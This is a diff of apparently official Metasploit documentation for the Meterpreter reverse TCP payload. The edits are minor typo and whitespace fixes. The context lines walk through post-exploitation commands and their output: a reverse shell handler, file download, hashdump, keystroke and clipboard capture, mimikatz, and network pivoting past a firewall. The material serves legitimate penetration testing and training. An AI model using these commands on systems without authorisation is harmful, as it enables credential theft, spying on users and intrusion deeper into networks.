@@ -30,7 +30,7 @@ Another way to use windows/meterpreter/reverse_tcp is to generate it as an execu
 you would want to do it with msfvenom. If you are old school, you have probably also heard of
 msfpayload and msfencode. msfvenom is a replacement of those.
 
-The following is a basic example of using msfvenom to to generate windows/meterpreter/reverse_tcp
+The following is a basic example of using msfvenom to generate windows/meterpreter/reverse_tcp
 as an executable:
 
 ```
@@ -90,7 +90,7 @@ For example:
 meterpreter > download C:\\Users\\user\\Desktop\\something.txt /tmp/
 [*] downloading: C:\Users\user\Desktop\something.txt -> /tmp//something.txt
 [*] download   : C:\Users\user\Desktop\something.txt -> /tmp//something.txt
-meterpreter > 
+meterpreter >
 ```
 
 The ```-r``` option for the command also allows you to download recursively.
@@ -154,7 +154,7 @@ Process 2076 created.
 To pass an argument, use the ```-a``` flag:
 
 ```
-meterpreter > execute -f iexplore.exe -a http://metasploit.com
+meterpreter > execute -f iexplore.exe -a https://metasploit.com
 Process 2016 created.
 ```
 
@@ -194,7 +194,7 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/win32
-meterpreter > 
+meterpreter >
 ```
 
 **keyscan_start**
@@ -261,7 +261,7 @@ meterpreter > getsystem
 **hashdump**
 
 The ```hashdump``` commands allows you to dump the Windows hashes if there are the right privileges.
-For sxample:
+For example:
 
 ```
 meterpreter > hashdump
@@ -283,7 +283,7 @@ repeatedly, you can use the auto_win32_multihandler.rc resource script in Metasp
 First, run the resource script:
 
 ```
-$ ./msfconsole -q -r scripts/resource/auto_win32_multihandler.rc 
+$ ./msfconsole -q -r scripts/resource/auto_win32_multihandler.rc
 [*] Processing scripts/resource/auto_win32_multihandler.rc for ERB directives.
 [*] resource (scripts/resource/auto_win32_multihandler.rc)> Ruby Code (776 bytes)
 lhost => 192.168.1.199
@@ -297,9 +297,9 @@ lport => 4444
 exitonsession => false
 [*] Exploit running as background job.
 
-[*] Started reverse TCP handler on 192.168.1.199:4444 
+[*] Started reverse TCP handler on 192.168.1.199:4444
 [*] Starting the payload handler...
-msf exploit(handler) > 
+msf exploit(handler) >
 ```
 
 Next, go to your ~/.msf4/local directory, you should see meterpreter_reverse_tcp.exe in there.
@@ -315,7 +315,7 @@ from popular applications and enumerate or modify system settings.
 To use a post module from the Meterpreter prompt, simply use the ```run``` command:
 
 ```
-meterpreter > run post/windows/gather/checkvm 
+meterpreter > run post/windows/gather/checkvm
 
 [*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....
 [*] This is a VMware Virtual Machine
@@ -336,7 +336,7 @@ To begin, load the extension:
 ```
 meterpreter > load mimikatz
 Loading extension mimikatz...success.
-meterpreter > 
+meterpreter >
 ```
 
 This will create more commands for the Meterpreter prompt. Most of them are meant to be used to
@@ -387,7 +387,7 @@ To begin, at the Meterpreter prompt, do:
 ```
 meterpreter > load extapi
 Loading extension extapi...success.
-meterpreter > 
+meterpreter >
 ```
 
 One great feature of the extension is clipboard management. The Windows clipboard is interesting
@@ -412,7 +412,7 @@ Text captured at 2016-03-05 19:13:39.0170
 hello, world!!
 =========================================
 
-meterpreter > 
+meterpreter >
 ```
 
 The limitation of this command is that since you're only grabbing whatever is in the clipboard at
@@ -422,7 +422,7 @@ whatever goes in there. To start, issue the following command:
 ```
 meterpreter > clipboard_monitor_start
 [+] Clipboard monitor started
-meterpreter > 
+meterpreter >
 ```
 
 While it is monitoring, you can ask Meterpreter to dump whatever's been captured.
@@ -444,7 +444,7 @@ download    : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png
 ==========================================
 
 [+] Clipboard monitor dumped
-meterpreter > 
+meterpreter >
 ```
 
 The ```clipboard_monitor_stop``` command will also dump the captured data, and then exit.
@@ -471,7 +471,7 @@ meterpreter > python_execute "x = 'hello world'; print x"
 [+] Content written to stdout:
 hello world
 
-meterpreter > 
+meterpreter >
 ```
 
 Another way to execute Python code is from a local file by using the ```python_import``` command.
@@ -503,13 +503,13 @@ To learn more about the Python extension, please read this [wiki](https://github
 
 **Network Pivoting**
 
-There are three mains ways that you can use for moving around inside a network: 
+There are three mains ways that you can use for moving around inside a network:
 
  - The route command in the msf prompt
  - The route command in the the Meterpreter prompt
  - The portfwd command
 
-***Routing through msfconsole*** 
+***Routing through msfconsole***
 
 The route command from the msf prompt allows you connect to hosts on a different network through the compromised machine. You should be able to determine that by looking at the compromised machine's ipconfig:
 
@@ -547,7 +547,7 @@ IPv4 Netmask : 255.255.255.255
 ...
 ```
 
-The example above shows that we have a Meterpreter connection to 192.168.1.201. Let's call this box A, and it  is connected to the 192.100.0.0/24 VPN network. As an attacker, we aren't connected to this network directly, but we can explore that network through box A. 
+The example above shows that we have a Meterpreter connection to 192.168.1.201. Let's call this box A, and it  is connected to the 192.100.0.0/24 VPN network. As an attacker, we aren't connected to this network directly, but we can explore that network through box A.
 
 At the msf prompt, do:
 
@@ -566,7 +566,7 @@ msf auxiliary(smb_version) > run
 [*] 192.100.0.101:445     - 192.100.0.101:445 is running Windows 2003 SP2 (build:3790) (name:SINN3R-QIXN9TA2) (domain:WORKGROUP)
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf auxiliary(smb_version) > 
+msf auxiliary(smb_version) >
 ```
 
 Another neat trick using route is that you can also bypass the compromised host's firewall this way. For example, if the host has HTTP open, but SMB is blocked by the firewall, you can try to compromise it via HTTP first. You'll need to use the route command to talk to SMB and then try to exploit SMB.
@@ -628,7 +628,7 @@ The timeout control basically defines the life span of Meterpreter. To configure
 ```set_timeouts``` command:
 
 ```
-meterpreter > set_timeouts 
+meterpreter > set_timeouts
 Usage: set_timeouts [options]
 
 Set the current timeout options.
@@ -671,7 +671,7 @@ meterpreter > irb
 [*] Starting IRB shell
 [*] The 'client' variable holds the meterpreter client
 
->> 
+>>
 ```
 
 **The client object**
